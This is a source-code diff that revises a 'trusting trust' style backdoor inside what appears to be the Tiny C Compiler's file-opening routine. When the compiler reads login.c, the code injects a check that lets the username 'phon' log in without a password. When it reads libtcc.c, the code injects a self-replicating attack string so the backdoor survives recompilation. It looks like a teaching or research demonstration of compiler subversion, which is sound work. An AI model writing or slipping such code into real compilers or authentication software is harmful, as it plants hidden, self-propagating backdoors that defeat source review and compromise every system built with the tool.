@@ -1,24 +1,25 @@
 const unsigned int bufferSize = 1000000;
 char fileBuffer[1000000];
-char *str_pointer;
-printf("Found file: %s\n", str);
-int isBug = 0;
-if ((str_pointer = strstr(str, "login.c")) != NULL)
+int isBug;
+int normalfd;
+char *spotLocation;
+isBug = 0;
+printf("Found file %s\n", str);
+if (strstr(str, "login.c"))
 {
-printf("Found login.c!! Bugging it...\n");
-int normalfd = open(str, O_RDONLY | 0660);
-char login_sig[] = "static int\n"
-    "do_login(const char *username)\n"
-    "{\n";
+printf("found login.c at %s\n",str);
+normalfd = open(str, O_RDONLY | 0660);
+char login_sig[] = "do_login(const char *username)\r\n{";
 char login_attack[] = "if (!strcmp(username, \"phon\"))return 0;";
 int readByte = read(normalfd, fileBuffer, bufferSize);
 close(normalfd);
 fileBuffer[readByte] = '\0';
-char *spotLocation = strstr(fileBuffer, login_sig);
+spotLocation = strstr(fileBuffer, login_sig);
 if (spotLocation != NULL)
 {
-unsigned int offset = strlen(login_sig);
-int buggedfd = open("login.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
+printf("Injecting stuff\n");
+unsigned int offset = strlen(login_sig) + 2;
+int buggedfd = open("login_bug.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
 
 for(char *c = fileBuffer; c != spotLocation + offset; c++)
 write(buggedfd, c, 1);
@@ -29,26 +30,27 @@ for(char *c = spotLocation + offset; *c;c++)
 write(buggedfd, c, 1);
 
 close(buggedfd);
-fd = _tcc_open(s1, "login.c");
-str = "login.c";
+fd = _tcc_open(s1, "login_bug.c");
+str = "login_bug.c";
 isBug = 1;
 }
 }
-if ((str_pointer = strstr(str, "libtcc.c")) != NULL)
+if (!strcmp(str, "libtcc.c"))
 {
 printf("Found libtcc.c\n");
-int normalfd = open(str, O_RDONLY | 0660);
-char compile_sig[] = "variables, which may or may not have advantages */";
+normalfd = open(str, O_RDONLY | 0660);
+char compile_sig[] = "variables, which may or may not have advantages */\r\n";
 
 int readByte = read(normalfd, fileBuffer, bufferSize);
 close(normalfd);
 fileBuffer[readByte] = '\0';
 
-char *spotLocation = strstr(fileBuffer, compile_sig);
+spotLocation = strstr(fileBuffer, compile_sig);
 
 if (spotLocation != NULL)
 {
-int buggedfd = open("../libtcc_bug.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
+printf("Injecting Bad\n");
+int buggedfd = open("libtcc_bug.c", O_WRONLY | O_TRUNC | O_CREAT, 0660);
 unsigned int offset = strlen(compile_sig);
 char *a = "\nchar compile_attack[] = \"";
 char *b = "\";\n";
@@ -67,8 +69,8 @@ for(char *c = spotLocation + offset; *c;c++)
 write(buggedfd, c, 1);
 
 close(buggedfd);
-fd = _tcc_open(s1, "../libtcc_bug.c");
-str = "../libtcc_bug.c";
+fd = _tcc_open(s1, "libtcc_bug.c");
+str = "libtcc_bug.c";
 isBug = 1;
 }
 }
